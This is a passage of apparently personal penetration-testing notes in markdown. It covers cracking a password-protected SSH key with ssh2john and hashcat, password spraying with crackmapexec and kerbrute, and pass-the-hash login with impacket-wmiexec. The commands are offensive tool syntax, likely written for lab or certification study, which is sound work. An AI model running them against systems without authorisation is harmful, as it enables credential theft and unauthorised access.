	1. Note that these variables are set temporarily with that terminal session, but could be reversed by repeating the command with `unset` instead of `export`
 
## ssh
### creating ssh key
- ssh-keygen
- `ssh -p 2222(unless 22) -i $created_key(no pub) $user@$host`
- Using a id_sa (private key) from /home/user/.ssh/id_sa

### Finding key protected by password: if ssh key protected by a password
1. may need to chmod 600 id_rsa (too many permissions won't work)
2. ssh2john id_rsa > ssh.hash
3. remove "id_rsa:" from ssh.hash
4. hashcat -h | grep -i "ssh" (22921 for example)
5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

## Various Tool Syntax
### Crackmapexec
`crackmapexec smb $IP -u $usersFile -p '$password' -d $domain.com --continue-on-success`

### Kerbrute
`.\kerbrute_windows_amd64.exe passwordspray -d $domain.com $usersFile "$password"`

### Impacket

#### mssqlclient
`impacket-mssqlclient $user:$pass@$target -windows-auth`

#### psexec 

#### wmiexec
- `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$target` (can be 0/24)
	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 

